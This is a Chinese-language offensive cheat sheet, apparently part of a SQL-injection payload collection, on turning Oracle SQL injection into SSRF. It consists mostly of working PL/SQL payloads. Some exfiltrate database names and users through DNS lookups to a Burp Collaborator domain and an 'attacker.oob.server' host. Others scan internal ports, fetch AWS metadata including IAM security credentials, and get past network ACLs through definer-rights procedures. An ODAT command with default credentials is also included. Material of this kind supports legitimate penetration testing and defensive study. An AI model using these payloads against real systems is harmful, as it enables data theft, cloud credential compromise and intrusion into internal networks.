---
attack_surface: [注入类]
impact: [远程代码执行, 信息泄露, SSRF]
risk_level: 严重
prerequisites:
  - SQL 注入基础
  - Oracle PL/SQL 语法
difficulty: 高级
related_techniques:
  - mysql-injection
  - mssql-injection
  - postgresql-injection
  - ssrf-server-side-request-forgery
tools:
  - sqlmap
  - ODAT
  - Burp Suite
---

# Oracle Injection — SSRF 与网络利用

> 关联文档：[SQL Injection 总览](../README.md) · [MSSQL Injection](../MSSQL%20Injection.md) · [MySQL Injection](../MySQL%20Injection.md) · [PostgreSQL Injection](../PostgreSQL%20Injection.md)

---

# 0x01 Oracle 网络 Callout 矩阵

Oracle 提供大量内置 PL/SQL 包可直接发起网络请求，构成 SQL Injection → SSRF 的独特攻击面：

| 包 | 函数 | 协议 | SSRF 能力 |
|---|------|------|----------|
| **DBMS_LDAP** | `INIT()` | LDAP (TCP) | DNS 外带 + 端口扫描 |
| **UTL_SMTP** | `OPEN_CONNECTION()` | SMTP (TCP) | 端口扫描 |
| **UTL_TCP** | `OPEN_CONNECTION()` | Raw TCP | 全 TCP 通信 + 云元数据 |
| **UTL_HTTP** | `REQUEST()` | HTTP/HTTPS | 完整 HTTP SSRF |
| **HTTPURITYPE** | `GETCLOB()` | HTTP/HTTPS | 简化 HTTP GET |
| **UTL_INADDR** | `GET_HOST_ADDRESS()` | DNS | DNS 解析 + 外带 |
| **DBMS_CLOUD** | `SEND_REQUEST()` | HTTP/HTTPS | 云版本完整 HTTP 客户端 |

---

# 0x02 DBMS_LDAP — DNS 外带 + 端口扫描

```sql
-- DNS 数据外带 (经典盲注)
SELECT DBMS_LDAP.INIT(
  (SELECT version FROM v$instance)||'.'||
  (SELECT user FROM dual)||'.'||
  (SELECT name FROM V$database)||'.'||
  'd4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',
  80
) FROM dual;

-- 内网端口扫描
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;   -- SSH
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;   -- HTTP
SELECT DBMS_LDAP.INIT('scanme.nmap.org',445) FROM dual;  -- SMB

-- 错误区分:
-- ORA-31203: DBMS_LDAP: PL/SQL - Init Failed. → 端口关闭
-- 返回 session 值 → 端口开放
```

---

# 0x03 UTL_SMTP — 邮件端口扫描

```sql
DECLARE c utl_smtp.connection;
BEGIN
  c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;

-- 错误区分:
-- ORA-29276: transfer timeout → 端口开放 (无 SMTP 握手)
-- ORA-29278: SMTP transient error → 端口关闭
```

---

# 0x04 UTL_TCP — 原始 TCP (云元数据)

UTL_TCP 支持自定义 TCP 数据包，可访问云实例元数据服务和其他内部服务：

```sql
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
  retval pls_integer;
BEGIN
  -- AWS 元数据
  c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
  retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
  retval := utl_tcp.write_line(c);
  BEGIN
    LOOP
      dbms_output.put_line(utl_tcp.get_line(c, TRUE));
    END LOOP;
  EXCEPTION
    WHEN utl_tcp.end_of_input THEN NULL;
  END;
  utl_tcp.close_connection(c);
END;
/

-- 内网端口扫描
DECLARE c utl_tcp.connection;
BEGIN
  c := utl_tcp.open_connection('192.168.1.1',22,tx_timeout => 4);
  utl_tcp.close_connection(c);
END;
```

---

# 0x05 UTL_HTTP — 标准 HTTP SSRF

```sql
-- 云元数据
SELECT UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') FROM dual;

-- 内网端口扫描
SELECT UTL_HTTP.request('http://192.168.1.1:22') FROM dual;
SELECT UTL_HTTP.request('http://192.168.1.1:8080') FROM dual;

-- 错误区分:
-- ORA-12541: TNS:no listener / TNS:operation timed out → 端口关闭
-- ORA-29263: HTTP protocol error / 返回数据 → 端口开放
```

## HTTPURITYPE — 简化版 HTTP

```sql
SELECT HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() FROM dual;
```

---

# 0x06 UTL_INADDR — DNS 外带 (无需端口)

`UTL_INADDR` 只需要域名，不触发网络 ACL 检查：

```sql
-- 通过 DNS 外带泄露数据
SELECT UTL_INADDR.get_host_address(
  (SELECT name FROM v$database)||'.'||
  (SELECT user FROM dual)||
  '.attacker.oob.server'
) FROM dual;

-- 失败时: ORA-29257: host resolution failed
-- 成功时: 返回解析 IP
```

⚠ 这是绕过 ACL 最可靠的原语 — 不需要 ACL 授权，只需要能发起 DNS 查询。

---

# 0x07 DBMS_CLOUD — 云版本完整 HTTP (21c/23c/Autonomous)

`DBMS_CLOUD.SEND_REQUEST` 支持自定义 HTTP 方法、头部、TLS 和大请求体：

```sql
BEGIN
  -- 创建无认证凭证
  DBMS_CLOUD.create_credential(
    credential_name => 'NOAUTH',
    username        => 'ignored',
    password        => 'ignored');
END;
/

DECLARE
  resp DBMS_CLOUD_TYPES.resp;
BEGIN
  resp := DBMS_CLOUD.send_request(
             credential_name => 'NOAUTH',
             uri             => 'http://169.254.169.254/latest/meta-data/',
             method          => 'GET',
             timeout         => 3);
  dbms_output.put_line(DBMS_CLOUD.get_response_text(resp));
END;
/
```

---

# 0x08 网络 ACL 绕过 (2023+)

Oracle 在 2023 年 7 月 CPU 后收紧默认 ACL — 非特权账户默认收到 `ORA-24247: network access denied`。

**两种绕过路径**：

1. **利用现有 ACL 条目** — 目标账户的 `DBMS_NETWORK_ACL_ADMIN.create_acl` 已被开发配置过

2. **滥用 DEFINER 权限过程** — 搜索 `AUTHID DEFINER` 的存储过程：

```sql
SELECT owner, object_name
FROM dba_objects
WHERE object_type = 'PROCEDURE'
  AND authid = 'DEFINER';
-- 审计中至少有一个报告/导出过程持有所需权限
```

---

# 0x09 ODAT 自动化工具

[ODAT (Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat) 支持自动检测和利用：

```bash
# OOB 全面检测
odat all -s 10.10.10.5 -p 1521 -d XE -U SCOTT -P tiger --modules oob

# 各模块单独检测:
# --utl_http  --utl_tcp  --httpuritype  --dbms_cloud
```

---

# 0x0A 参考资料

- [Using SQL Injection for SSRF/XSPA (ibreak.software)](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)
- [Oracle DBMS_CLOUD Documentation](https://docs.oracle.com/en/cloud/paas/autonomous-database/serverless/)
- [ODAT — Oracle Database Attacking Tool](https://github.com/quentinhardy/odat)
- [Docker Oracle 12c Setup](https://github.com/MaksymBilenko/docker-oracle-12c)
